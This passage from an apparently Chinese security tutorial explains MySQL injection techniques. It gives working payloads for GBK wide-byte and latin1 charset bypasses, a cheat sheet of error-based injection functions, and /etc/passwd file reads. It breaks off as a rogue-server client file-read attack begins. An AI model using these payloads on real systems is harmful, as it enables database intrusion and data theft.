class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$conn-&gt;query(<span class="string">"set names 'gbk';"</span>);</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure><p><code>addslashes</code>函数将会把POST接收到的username与password的部分字符进行转义处理。如下：</p><ul><li>字符<code>&#39;、&quot;、\</code>前边会被添加上一条反斜杠<code>\</code>作为转义字符。</li><li>多个空格被过滤成一个空格。</li></ul><p>这使得我们原本的payload被转义成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username &#x3D; &#39;admin\&#39;#&#39; and password&#x3D;&#39;123&#39;;</span><br></pre></td></tr></table></figure><p>注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为<code>admin&#39;#</code>且密码为123的用户。</p><p>但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn-&gt;query(&quot;set names &#39;gbk&#39;;&quot;);</span><br></pre></td></tr></table></figure><p>其作用相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;gbk&#39;;</span><br></pre></td></tr></table></figure><p>当我们输入的数据为：<code>username=%df%27or%201=1%23&amp;password=123</code></p><p>经过addslashes函数处理最终变成：<code>username=%df%5c%27or%201=1%23&amp;password=123</code></p><p>经过gbk解码得到：<code>username=運&#39;or 1=1#</code>、<code>password=123</code>，拼接到SQL语句得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username &#x3D; &#39;運&#39;or 1&#x3D;1#&#39; and password&#x3D;&#39;123&#39;;</span><br></pre></td></tr></table></figure><p>成功跳出了addslashes的转义限制。</p><h4 id="具体解释"><a href="#具体解释" class="headerlink" title="具体解释"></a>具体解释</h4><p>前边提到：<code>set names &#39;gbk&#39;;</code>相当于执行了如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;gbk&#39;;</span><br></pre></td></tr></table></figure><p>那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的<code>character_set_client</code>所设置的编码进行转码，本例是gbk编码。</p><p>由于PHP的编码为<code>UTF-8</code>，我们输入的内容为<code>%df%27</code>，会被当做是两个字符，其中<code>%27</code>为单引号<code>&#39;</code>。</p><p>经过函数<code>addslashes</code>处理变成<code>%df%5c%27</code>，<code>%5c</code>为反斜线<code>\</code>。</p><p>在经过客户端层<code>character_set_client</code>编码处理后变成：<code>運&#39;</code>，成功将反斜线给“吞”掉了，使单引号逃逸出来。</p><h3 id="Latin1默认编码"><a href="#Latin1默认编码" class="headerlink" title="Latin1默认编码"></a>Latin1默认编码</h3><p>讲完了gbk造成的编码问题，我们再讲讲latin1造成的编码问题。</p><p>老样子，先举个例子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//该代码节选自：离别歌's blog</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"cat"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">"Connect failed: %s\n"</span>, $mysqli-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"set names utf8"</span>);</span><br><span class="line"></span><br><span class="line">$username = addslashes($_GET[<span class="string">'username'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们在其基础上添加这么一条语句。</span></span><br><span class="line"><span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You can't do this."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Select queries return a resultset */</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM `table1` WHERE username='&#123;$username&#125;'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result = $mysqli-&gt;query( $sql )) &#123;</span><br><span class="line">    printf(<span class="string">"Select returned %d rows.\n"</span>, $result-&gt;num_rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($row = $result-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($row);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free result set */</span></span><br><span class="line">    $result-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    var_dump($mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>建表语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;table1&#96; (</span><br><span class="line">  &#96;id&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;username&#96; varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  &#96;password&#96; varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM AUTO_INCREMENT&#x3D;1 DEFAULT CHARSET&#x3D;latin1 COLLATE&#x3D;latin1_general_ci;</span><br></pre></td></tr></table></figure><p>我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。</p><p>我们往表中添加一条数据：<code>insert table1 VALUES(1,&#39;admin&#39;,&#39;admin&#39;);</code></p><p>注意查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You can't do this."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输出的内容进行addslashes处理，使得我们无法逃逸出单引号。</p><p>这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？</p><p>我们注意到：<code>$mysqli-&gt;query(&quot;set names utf8&quot;);</code>这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。</p><p>上边在gbk宽字节注入的时候讲到过：<code>set names utf8;</code>相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;utf8&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;utf8&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;utf8&#39;;</span><br></pre></td></tr></table></figure><p>前边说道：PHP的编码是<code>UTF-8</code>，而我们现在设置的也是<code>UTF-8</code>，怎么会产生问题呢？</p><p>别着急，让我接着往下说。前边我们提到：SQL语句会先转成<code>character_set_client</code>设置的编码。但，他接下来还会继续转换。<code>character_set_client</code>客户端层转换完毕之后，数据将会交给<code>character_set_connection</code>连接层处理，最后在从<code>character_set_connection</code>转到数据表的内部操作字符集。</p><p>来本例中，字符集的转换为：<code>UTF-8—&gt;UTF-8-&gt;Latin1</code></p><p>这里需要讲一下UTF-8编码的一些内容。</p><blockquote><p>UTF-8编码是变长编码，可能有1~4个字节表示：</p><ol><li>一字节时范围是<code>[00-7F]</code></li><li>两字节时范围是<code>[C0-DF][80-BF]</code></li><li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code></li><li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ol><p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：</p><p><img src="/img/loading.gif" alt="UTF8编码" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/utf8.jpg"></p><p>所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p><p>关于所有的UTF-8字符，你可以在这个表中一一看到： <a href="http://utf8-chartable.de/unicode-utf8-table.pl" target="_blank" rel="noopener">http://utf8-chartable.de/unicode-utf8-table.pl</a></p><p>引自：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysql字符编码利用技巧</a></p></blockquote><p>利用这一特性，我们输入：<code>?username=admin%c2</code>，<code>%c2</code>是一个Latin1字符集不存在的字符。</p><p>由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。</p><p>但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：<code>00-7F、C2-EF</code>。</p><p>而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。</p><p>利用这一特性，我们的payload为<code>?username=admin%c2</code>，此处的<code>%c2</code>换为<code>%c2-%ef</code>均可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;table1&#96; WHERE username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><p>因为<code>admin%c2</code>在最后一层的内部操作字符集转换中变成<code>admin</code>。</p><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。</p><p>那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。</p><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：</p><ul><li>BigInt等数据类型溢出</li><li>函数参数格式错误</li><li>主键/字段重复</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p>函数语法：<code>exp(int)</code></p><p>适用版本：5.5.5~5.5.49</p><p>该函数将会返回e的x次方结果。正常如下图：</p><p><img src="/img/loading.gif" alt="exp函数正常执行" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/expRight.png"></p><p>为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。如下图：</p><p><img src="/img/loading.gif" alt="exp错误执行" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/expError.png"></p><p>我们的payload为：<code>exp(~(select * from(select user())a))</code></p><p>其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。至于为什么需要用两层子查询，这点我暂时还没有弄明白，欢迎有了解的大牛找我讨论: )</p><p>除了<code>exp()</code>之外，还有类似<code>pow()</code>之类的相似函数同样是可利用的，他们的原理相同。</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>函数语法：<code>updatexml(XML_document, XPath_string, new_value);</code></p><p>适用版本: 5.1.5+</p><p>我们通常在第二个xpath参数填写我们要查询的内容。</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>前后添加~使其不符合xpath格式从而报错。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="rand-group-count"><a href="#rand-group-count" class="headerlink" title="rand()+group()+count()"></a>rand()+group()+count()</h3><p>虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故<code>rand()</code>不能后接在<code>order/group by</code>上。</p><p>举一个例子：假设user表有三条数据，我们通过：<code>select * from user group by username</code> 来通过其中的username字段进行分组。</p><p>此过程会先建立一个<strong>虚拟表</strong>，存在两个字段：<code>key，count</code></p><p>其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：<code>username=test&amp;password=test</code></p><p>username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。</p><p>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成0~1之间随机一个小数、<code>floor()</code>取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。</p><p>若表中有三行数据：我们通过<code>select * from user group by floor(rand(0)*2)</code>进行排序的话。</p><p>注意，由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…</p><p>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果1，故虚表插入的内容为<code>key=1&amp;count=1</code>。</p><p>第二次执行group by时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。</p><p>第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段key为<strong>主键</strong>，具有不可重复性，故虚表在尝试插入时将产生错误。</p><p>图文：</p><blockquote><p>1.查询前默认会建立空虚拟表如下图:</p><p><img src="/img/loading.gif" alt="空的虚拟表" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/defaultEmpty.jpg"></p><p>2.取第一条记录，执行floor(rand(0)<em>2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)</em>2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p><p><img src="/img/loading.gif" alt="第一次计算" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/firstCount.jpg"></p><p>\3.查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)</em>2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:</p><p><img src="/img/loading.gif" alt="第二次计算" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/secondCount.jpg"></p><p>4.查询第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)</em>2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p><p>5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p><p>引自：——<a href="http://drops.wooyun.org/tips/14312" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></p></blockquote><p>payload用法: <code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><h3 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h3><ul><li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint()：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring()：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestring()：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygon() ：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h3 id="不存在的函数"><a href="#不存在的函数" class="headerlink" title="不存在的函数"></a>不存在的函数</h3><p>随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。</p><p><img src="/img/loading.gif" alt="不存在的函数报错" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/noExit.png"></p><h3 id="Bigint数值操作："><a href="#Bigint数值操作：" class="headerlink" title="Bigint数值操作："></a>Bigint数值操作：</h3><p>当mysql数据库的某些边界数值进行数值运算时，会报错的原理。</p><p>如~0得到的结果：18446744073709551615</p><p>若此数参与运算，则很容易会错误。</p><p>payload: <code>select !(select * from(select user())a)-~0;</code></p><h3 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a>name_const()</h3><p>仅可取数据库版本信息</p><p>payload: <code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><h3 id="uuid相关函数"><a href="#uuid相关函数" class="headerlink" title="uuid相关函数"></a>uuid相关函数</h3><p>适用版本：8.0.x</p><p>参数格式不正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><h3 id="join-using-注列名"><a href="#join-using-注列名" class="headerlink" title="join using()注列名"></a>join using()注列名</h3><p>通过系统关键词join可建立两个表之间的内连接。</p><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p><p>并且报错信息会存在重复的列名，可以使用 <strong>USING</strong> 表达式声明内连接（INNER JOIN）条件来避免报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>参数格式不正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select gtid_subset(user(),1);</span><br><span class="line">mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">mysql&gt;select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><h3 id="报错函数速查表"><a href="#报错函数速查表" class="headerlink" title="报错函数速查表"></a>报错函数速查表</h3><p>注：默认MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>类别</th><th>函数</th><th>版本需求</th><th>5.5.x</th><th>5.6.x</th><th style="text-align:center">5.7.x</th><th>8.x</th><th>函数显错长度</th><th>Mysql报错内容长度</th><th>额外限制</th></tr></thead><tbody><tr><td>主键重复</td><td>floor round</td><td>❓</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td></td><td>64</td><td></td><td>data_type ≠ varchar</td></tr><tr><td>列名重复</td><td>name_const</td><td>❓</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td></td><td></td><td>only version()</td></tr><tr><td>列名重复</td><td>join</td><td>[5.5.49, ?)</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td></td><td></td><td>only columns</td></tr><tr><td>数据溢出 - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td style="text-align:center"></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>数据溢出 - BIGINT</td><td>1+~0</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td style="text-align:center"></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>几何对象</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>✔️</td><td></td><td style="text-align:center"></td><td></td><td></td><td>244</td><td></td></tr><tr><td>空间函数 Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td style="text-align:center">✔️</td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td style="text-align:center">✔️</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td style="text-align:center"></td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td>32</td><td></td></tr></tbody></table><blockquote><p>摘自——<a href="https://blog.sari3l.com/posts/9622f295/" target="_blank" rel="noopener">Mysql 注入基础小结</a></p></blockquote><h2 id="文件读-写"><a href="#文件读-写" class="headerlink" title="文件读/写"></a>文件读/写</h2><p>我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</p><p>简单的说：<code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure><p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p>修改：</p><ul><li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li><li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li></ul><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>Mysql读取文件通常使用load_file函数，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file_path);</span><br></pre></td></tr></table></figure><p>第二种读文件的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;; #读取服务端文件</span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;; #读取客户端文件</span><br></pre></td></tr></table></figure><p>限制：</p><ul><li>前两种需要<code>secure-file-priv</code>无值或为有利目录。</li><li>都需要知道要读取的文件所在的绝对路径。</li><li>要读取的文件大小必须小于<code>max_allowed_packet</code>所设置的值</li></ul><h4 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h4><p>5.5.53<code>secure-file-priv=NULL</code>读文件payload，mysql8测试失败，其他版本自测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">drop table mysql.m1;</span><br><span class="line">CREATE TABLE mysql.m1 (code TEXT );</span><br><span class="line">LOAD DATA LOCAL INFILE &#39;D:&#x2F;&#x2F;1.txt&#39; INTO TABLE mysql.m1 fields terminated by &#39;&#39;;</span><br><span class="line">select * from mysql.m1;</span><br></pre></td></tr></table></figure><h4 id="Mysql连接数据库时可读取文件"><a href="#Mysql连接数据库时可读取文件" class="headerlink" title="Mysql连接数据库时可读取文件"></a>Mysql连接数据库时可读取文件</h4><p>这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。</p><p>简单描述该漏洞：Mysql客户端在执行<code>load data local</code>语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</p><blockquote><p>原本的查询流程为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我要把我的win.ini文件内容插入test表中</span><br><span class="line">服务端：好，我要你的win.ini文件内容</span><br><span class="line">客户端：win.ini的内容如下....</span><br></pre></td></tr></table></figure><p>假设服务端由我们控制，把一个正常的流程篡改成如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我要把我的win.ini文件内容插入test表中</span><br><span class="line">服务端：好，我要你的conn.php内容</span><br><span class="line">客户端：conn.php的内容如下???</span><br></pre></td></tr></table></figure><p>例子部分修改自：<a href="https://paper.seebug.org/1112/" target="_blank" rel="noopener">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p></blockquote><p>换句话说：<code>load data local</code>语句要读取的文件会受到服务端的控制。</p><p>其次，在<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html" target="_blank" rel="noopener">Mysql官方文档对于<code>load data local</code>语句的安全说明</a>中有这么一句话:</p><blockquote><p>A patched server could in fact reply with a file-transfer request to any statement, not just <a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>, so a more fundamental issue is that clients should not connect to untrusted servers.</p></blockquote><p>意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是<code>load data local</code>语句。</p><p>这就会产生什么结果呢？之前讲的例子，将可以变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我需要查询test表下的xx内容</span><br><span class="line">服务端：我需要你的conn.php内容</span><br><span class="line">客户端：conn.php的内容如下???</span><br></pre></td></tr></table></figure><p>可以看到，客户端相当于被攻击者给<strong>半劫持</strong>了。</p><p>利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。</p><p>简易恶意服务端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 